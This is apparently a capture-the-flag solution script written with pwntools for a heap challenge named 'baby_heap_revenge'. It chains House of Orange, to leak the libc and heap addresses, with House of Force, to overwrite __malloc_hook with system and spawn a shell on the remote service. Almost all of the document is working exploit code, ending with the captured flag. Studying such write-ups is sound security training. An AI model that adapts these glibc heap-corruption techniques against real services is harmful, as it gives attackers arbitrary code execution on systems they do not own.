# -*- coding: UTF-8 -*-
#!/usr/bin/env python 

from pwn import *

LOCAL  = False
Debug  = False
SERVER = '172.16.113.50'
PORT   = 12039
Binary = 'baby_heap_revenge'

if LOCAL:
    libc = ELF('../../libc-2.19.so')
else:
    libc = ELF('./libc.so.6')

      
def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote(SERVER, PORT)
else:
    r = process('./{}'.format(Binary))
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')


"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO  -> Got.plt read only
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
"""
def allocate(size,data):
    L(r.recvuntil('Your '))
    r.sendlineafter('choice: ', '1')
    L(r.recvuntil(' '))
    r.sendlineafter(':', size)
    L(r.recvuntil(' '))
    r.sendafter(':', data)
    
def show():
    r.sendlineafter('choice:', '2')

def exit():
    r.sendlineafter('choice:', '3')

if __name__ == "__main__":

    # House of orange  +  House of force
    # 1. use house of orange to leak 
    # 2. use house of force to hijack
    

    ######### Tips #########

    # house of orange (leak without free in the program)
    # 1. 大于MINSIZE(0X10)
    # 2. 小于所需的大小 + MINSIZE
    # 3. prev inuse位设置为1
    # 4. old_top + oldsize的值是page align

    # main_arena_offset = __malloc_hook_offset + xx (need to see in the libc)

    ######### Tips #########
    
    
    
    # Step 1 : leak libc address and heap address
    
    ## make top chunck to unsortbin    
    allocate('24','/bin//sh;cat\x00')  
    allocate('24','\x00'*24+'\xc1\x1f'+'\x00'*6) 
    allocate('8192','a')
    
    ## leak libcaddress and heap by unsortbin
    allocate('1024','a'*8)
    show()
    res = r.recvuntil('$')
    arena_1768 = u64(res.split('\n')[0].split('aaaaaaaa')[1].ljust(8,'\x00'))
    if LOCAL:
        __malloc_hook = arena_1768 - 1768 - 0x20
    else:
        __malloc_hook = arena_1768 - 1768 - 0x10
    print '__malloc_hook :', hex(__malloc_hook)
        
    allocate('1024','a'*16)
    show()
    res = r.recvuntil('$')
    heap = u64(res.split('\n')[0].split('a'*16)[1].ljust(8,'\x00')) 
    print 'heap :', hex(heap)
    
    allocate('6000', '123') # padding to make the malloc back to use top chunk
    
    
    # Step 2 : Hijack __malloc_hook with system
    
    sys_add = __malloc_hook - libc.symbols['__malloc_hook'] + libc.symbols['system'] 
    allocate('24','\xff'*32)

    ## nb = newtop - oldtop - 0x10
    nb =  __malloc_hook - 0x10 - ( heap + 0x22be0) - 0x10
    allocate(str(nb),'111122223333')
    allocate('24', p64(sys_add)+p64(0)*3) # hijack with system add
    
    # Step 3 : Trigger
    
    ## because size will be the add of string 
    ## change the heap add to size 
    
    bin_s = (heap & 0xfffffffffffff000 ) + 0x10
    
    print 'bin :',hex(bin_s)
    L(r.recvuntil('Your '))
    r.sendlineafter('choice: ', '1')
    L(r.recvuntil(' '))
    r.sendlineafter(':', str(bin_s))
   
    r.interactive()
   
    #FLAG{YOUARENOTBABYATALL}

